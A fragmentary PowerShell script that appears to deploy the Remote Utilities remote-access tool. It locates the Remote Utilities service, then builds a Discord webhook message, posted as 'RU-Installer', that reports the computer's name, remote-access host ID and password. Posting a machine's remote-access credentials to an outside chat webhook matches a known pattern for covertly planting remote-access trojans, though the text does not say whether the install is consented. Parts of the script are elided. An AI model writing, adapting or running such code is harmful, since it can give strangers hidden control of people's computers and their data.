...
$svc = Get-Service | Where-Object { $_.DisplayName -like "*Remote Utilities*" -or $_.Name -like "*RuDesktop*" -or $_.Name -like "*rfuscserver*" } | Select-Object -First 1
if ($svc) {
...
if ($discordWebhook -and $hostID) {
    $body = '{"username":"RU-Installer","embeds":[{"title":"Host Ready","color":65280,"fields":[{"name":"Computer","value":"' + $hostName + '","inline":true},{"name":"Host ID","value":"' + $hostID + '","inline":true},{"name":"Password","value":"' + $hostPassword + '","inline":true}]}]}'
    ...
    Write-Host "Host ID not found yet - Remote Utilities may need a minute to generate it."
    Write-Host "Check registry: HKLM\SOFTWARE\Remote Utilities\Host"
}
